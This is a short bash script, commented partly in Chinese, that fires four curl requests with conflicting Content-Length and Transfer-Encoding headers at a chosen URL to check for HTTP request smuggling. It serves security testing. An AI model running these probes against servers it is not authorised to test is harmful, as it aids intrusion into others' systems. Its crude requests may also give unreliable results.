#!/bin/bash
# HTTP Request Smuggling 模糊测试脚本

TARGET="${1:-http://localhost:8080}"
echo "Testing HTTP Request Smuggling against: $TARGET"

# CL.TE (Content-Length + Transfer-Encoding)
echo "=== Testing CL.TE ==="
curl -X POST "$TARGET" \
  -H "Content-Length: 13" \
  -H "Transfer-Encoding: chunked" \
  -d "0

SMUGGLED" -v

# TE.CL (Transfer-Encoding + Content-Length)
echo "=== Testing TE.CL ==="
curl -X POST "$TARGET" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 3" \
  -d "0

SMUGGLED" -v

# TE.TE (双重 Transfer-Encoding)
echo "=== Testing TE.TE ==="
curl -X POST "$TARGET" \
  -H "Transfer-Encoding: chunked" \
  -H "Transfer-Encoding: identity" \
  -d "0

SMUGGLED" -v

# 大小写混淆
echo "=== Testing Case Confusion ==="
curl -X POST "$TARGET" \
  -H "Transfer-Encoding: Chunked" \
  -H "Content-Length: 13" \
  -d "0

SMUGGLED" -v


